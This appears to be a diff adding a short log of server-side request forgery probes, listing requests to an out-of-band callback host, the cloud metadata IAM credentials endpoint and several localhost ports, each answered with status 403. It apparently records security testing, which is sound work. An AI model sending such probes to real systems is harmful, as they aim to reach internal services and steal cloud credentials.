@@ -1,0 +1,6 @@
+[cb1] 403 33985  <- http://oobe6bd84ac6e22.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in/ssrf-imgopt
+[cb2] 403 33982  <- http://oobe6bd84ac6e22.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in/imgopt?x=1
+[meta] 403 33976  <- http://169.254.169.254/latest/meta-data/iam/security-credentials/
+[local] 403 34002  <- http://127.0.0.1:80/
+[local8080] 403 33989  <- http://127.0.0.1:8080/
+[local3000] 403 33994  <- http://127.0.0.1:3000/
